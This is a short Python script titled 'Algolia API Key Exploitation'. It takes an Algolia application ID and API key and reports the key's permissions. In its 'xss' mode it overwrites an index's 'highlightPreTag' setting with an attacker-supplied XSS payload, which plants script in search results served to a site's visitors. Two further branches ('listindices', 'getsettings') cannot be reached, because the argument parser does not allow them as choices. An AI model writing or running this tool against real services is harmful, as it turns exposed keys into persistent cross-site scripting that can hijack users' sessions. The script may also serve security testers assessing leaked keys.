import argparse
parser = argparse.ArgumentParser(
                    prog='Algolia API Key Exploitation',
                    description='Attempt to check and exploit permissions in Algolia')
parser.add_argument('--apikey','-k',
                    dest='apikey',required=True)
parser.add_argument('--appid','-id',
                    dest='appid',required=True)
parser.add_argument('--index','-i',
                    dest='index')
parser.add_argument('--xsspayload','-x',
                    dest='xsspayload')
parser.add_argument('--action','-a',
                    dest='action',choices=['permissions','xss'], required=True)
args = parser.parse_args()
print(f'Using {args.apikey} with ID {args.appid}...')
if args.action == 'listindices':
    from algoliasearch.search_client import SearchClient
    client = SearchClient.create(args.appid,args.apikey)
    indices=client.list_indices()
    print(indices)
elif args.action == 'getsettings':
    if not args.index:
        print('You must proivde an index (--index)!')
        exit()
    from algoliasearch.search_client import SearchClient
    # Use an API key with `listIndexes` ACL
    client = SearchClient.create(args.appid, args.apikey)
    index = client.init_index(args.index)
    settings = index.get_settings()
    print(settings)
elif args.action == 'permissions':
    from algoliasearch.search_client import SearchClient
    # Use an API key with `listIndexes` ACL
    client = SearchClient.create(args.appid, args.apikey)
    permissions = client.get_api_key(args.apikey)
    print(permissions)
elif args.action == 'xss':
    if not args.index or not args.xsspayload:
        print('You must proivde both an index (--index) and an XSS Payload (--xsspayload)!')
        exit()
    from algoliasearch.search_client import SearchClient
    # Use an API key with `listIndexes` ACL
    client = SearchClient.create(args.appid, args.apikey)
    index = client.init_index(args.index)
    res = index.set_settings({
        "highlightPreTag":args.xsspayload
    })
    print(res)
